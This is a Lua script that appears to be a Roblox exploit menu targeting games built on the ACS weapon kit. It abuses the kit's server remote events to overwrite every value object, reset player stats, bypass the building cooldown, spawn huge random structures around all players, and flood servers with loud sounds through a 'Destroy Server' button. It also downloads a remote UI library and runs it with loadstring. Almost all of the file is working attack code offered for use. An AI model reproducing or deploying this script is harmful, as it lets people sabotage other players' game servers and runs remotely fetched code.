local PS = game:GetService("Players")
local RS = game:GetService('ReplicatedStorage')
for _, object in pairs(RS:GetDescendants()) do
    if not RS:FindFirstChild("ACS_Engine") then
        print("RemoteEvent '" .. object.Name .. "' not found!")
        return
    end
end
local ACS_Event = RS['ACS_Engine'].Events

function getAC6_Sounds()
	local ACS_Table = {}
	for _, v in pairs(workspace:GetDescendants()) do
		if v.Name == "AC6_FE_Sounds" then
			table.insert(ACS_Table, v)
		end
	end
	return ACS_Table
end

local ACS_sound_table = getAC6_Sounds()

function setValue(ValueObj, NewValue)
	ACS_Event.Refil:FireServer(ValueObj, NewValue)
end

function setSound(pitch, Volume, SoundID, Remote, looped)
    looped = looped or true
	local randomized_id = "V3rm was here".. math.random(58398327)
   	local Args = {
		[1] = "newSound",
		[2] = randomized_id,
		[3] = game.InsertService,
		[4] = 'rbxassetid://'..SoundID,
		[5] = pitch,
		[6] = Volume,
		[7] = looped
	}
   	Remote:FireServer(unpack(Args))
	return {[1] = "playSound", [2] = randomized_id}
end
local SongList = {3929730934, 5567523008, 5517133180, 2631687985, 2478816735, 188088048, 343430735}

local DestructionFuncs = {
	["Change_AllValue"] = function(type, any)
		for _, obj in pairs(game:GetDescendants()) do
			if obj:IsA(type) then
				setValue(obj, any)
			end
		end
	end,
	["Change_Playertime"] = function(timestr, num)
		for _, obj in pairs(PS:GetDescendants()) do
			if obj:IsA("NumberValue") or obj:IsA("IntValue") then
			 	if obj.Name == timestr and obj.Name ~= "Kit" then
					setValue(obj, num)
			 	end
			end
	 	end
	end,
	["Mess_building"] = function(vec, min, max)
		for _, v in pairs(PS:GetPlayers()) do
			local lol = v.Character.HumanoidRootPart.CFrame
			ACS_Event.Breach:InvokeServer(3, {
				Fortified = {},
				Destroyable = workspace
			}, CFrame.new(), CFrame.new(), {
				CFrame = lol * CFrame.new(vec),
				Size  = {
					X = math.random(min, max),
					Y = math.random(min, max),
					Z = math.random(min, max)
				}
			})
		end
	end,
	["Make_Loud_Sounds"] = function()
		for i = 0, #ACS_sound_table() do
			local acs_sound = ACS_sound_table()[i]
			local soundshit = SongList[math.random(1, #SongList)]
			acs_sound:FireServer(unpack(setSound(math.random(-3, 3), math.random(1, 100), soundshit, acs_sound)))
		end
	end
}
function getRNGVec()
	return Vector3.new(math.random(0, 500), math.random(0, 500), math.random(0, 500))
end

--Initialize bypass building cooldown.
function getACS_Class(plr, type)
	if plr.Character:FindFirstChild("ACS_Client") then
		return plr.Character.ACS_Client[type]
	else return nil end
end
for _, v in pairs(PS:GetPlayers()) do
	if getACS_Class(v, "Kit") ~= nil then
		ACS_Event.Refil:FireServer(getACS_Class(v, "Kit").Fortifications, -99999999)
	end
end

local VALUE_LIST = {'StringValue', 'NumberValue', 'IntValue', 'ObjectValue', 'BoolValue', 'BrickColorValue', 'Vector3Value', 'CFrameValue', 'Color3Value'}
local FUCKING_NIL = math.huge * math.huge

local VERSION = "v1.0"

local github = 'https://raw.githubusercontent.com/'
local repoName = 'system32unknown'
local repo = github..repoName..'/LinoriaLib/main/'

local Library = loadstring(game:HttpGet(repo..'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo..'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo..'addons/SaveManager.lua'))()

--Exploit Properties
local num = 0
local typed_val = ''
local isnil = false
local curColor = Color3.new(0, 0, 0)
local curRNGBuild = 0

if _G.loaded then
	print("already loaded you dumb")
	return
end
_G.loaded = true

local Window = Library:CreateWindow({Title = '[FE] ACS Exploit by White Site Members ' .. VERSION, Center = true, AutoShow = true}) do
	local Tabs = {Main = Window:AddTab('Main'), Destruction = Window:AddTab('Destruction'), ['UI Settings'] = Window:AddTab('UI Settings')} do
		local Tab = Tabs.Main:AddLeftTabbox('Main') do
	    	local MainTab = Tab:AddTab('Main') do
                MainTab:AddButton("Change Value", function()
					DestructionFuncs["Change_AllValue"](typed_val, (isnil and FUCKING_NIL or num))
                end)

	    	    MainTab:AddInput('ObjNumValue', {Numeric = false, Finished = false, Text = 'Object Num Value', Placeholder = 'Number', Callback = function(Value)
					if tonumber(Value) then
	    	        	num = tonumber(Value)
					else num = Value end
	    	    end})

				MainTab:AddDropdown("Dropdown Type", {
					Values = VALUE_LIST,
					Default = 1, -- number index of the value / string
					Multi = false, -- true / false, allows multiple choices to be selected
				
					Text = 'Dropdown Type',
				
					Callback = function(Value)
						typed_val = Value
					end
				})

				MainTab:AddDivider()

				MainTab:AddLabel('Color'):AddColorPicker('ValueColorPicker', {
					Default = Color3.fromRGB(0, 0, 0), -- Bright green
					Callback = function(Value)
						curColor = Value
					end
				})

                MainTab:AddButton("Change ValueColor", function()
					DestructionFuncs["Change_AllValue"]('Color3Value', curColor)
                end)

				MainTab:AddToggle('IsNil', {Text = 'Is Nil', Callback = function(Value)
	    	        isnil = Value
	    	    end})

				MainTab:AddDivider()

				MainTab:AddToggle('ObjBoolValue', {Text = 'Bool Value', Callback = function(Value)
	    	        DestructionFuncs["Change_AllValue"]('BoolValue', Value)
	    	    end})
	    	end
        end
		local DestructionTab = Tabs.Destruction:AddLeftTabbox('Destruction Servers') do
	    	local lmaoTab = DestructionTab:AddTab('Main') do
                lmaoTab:AddButton("Destroy Time Value", function()
					DestructionFuncs["Change_Playertime"](typed_val, (isnil and FUCKING_NIL or num))
                end)
				lmaoTab:AddSlider('RNGBuildSize', {
					Default = 2,
					Text = 'RNG Size Range',
					Min = 0,
					Max = 800,
					MaxSize = 800,
					Rounding = 1,
					Compact = false,
					Callback = function(Value) curRNGBuild = Value end
				})
                lmaoTab:AddButton("Mass Build", function()
					DestructionFuncs["Mess_building"](getRNGVec(), 1, curRNGBuild)
                end)
                lmaoTab:AddButton("Destroy Server", function()
					DestructionFuncs["Mess_building"](getRNGVec(), 1, 600)
					for _ = 0, 50 do
						DestructionFuncs["Make_Loud_Sounds"]()
					end
                end)
	    	end
        end

		Library:OnUnload(function()
		    Library.Unloaded = true
            _G.loaded = false
		end)

		-- UI Settings
		local MenuGroup = Tabs['UI Settings']:AddLeftTabbox('Menu')

		local lol = MenuGroup:AddTab("Menu")
		lol:AddButton('Unload', function() Library:Unload() end)
		lol:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {Default = 'End', NoUI = true, Text = 'Menu keybind'})

		Library.ToggleKeybind = Options.MenuKeybind -- Allows you to have a custom keybind for the menu

		ThemeManager:SetLibrary(Library)
		SaveManager:SetLibrary(Library)

		SaveManager:IgnoreThemeSettings()
		SaveManager:SetIgnoreIndexes({'MenuKeybind'})

		ThemeManager:SetFolder('MyScriptHub')
		SaveManager:SetFolder('MyScriptHub/specific-game')

		SaveManager:BuildConfigSection(Tabs['UI Settings'])
		ThemeManager:ApplyToTab(Tabs['UI Settings'])
	end
end

Library:Notify('Script fully loaded!')
Library:Notify('Press '.. Library.ToggleKeybind.Value ..' to toggle the menu!')